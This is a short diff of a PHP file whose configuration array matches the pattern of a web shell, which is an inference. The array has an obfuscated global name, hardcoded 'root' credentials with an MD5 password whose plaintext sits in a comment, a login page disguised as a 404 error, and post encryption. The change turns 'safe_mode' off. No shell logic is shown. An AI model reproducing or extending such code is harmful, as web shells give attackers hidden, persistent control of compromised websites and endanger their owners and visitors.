@@ -8,7 +8,7 @@
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'root',
     'password' => '2ba059dcd0affc43f71df7ea90abf2fa',//md5(Raumania)
-    'safe_mode' => '1',
+    'safe_mode' => '0',
     'login_page' => '404',
     'show_icons' => '1',
     'post_encryption' => true,
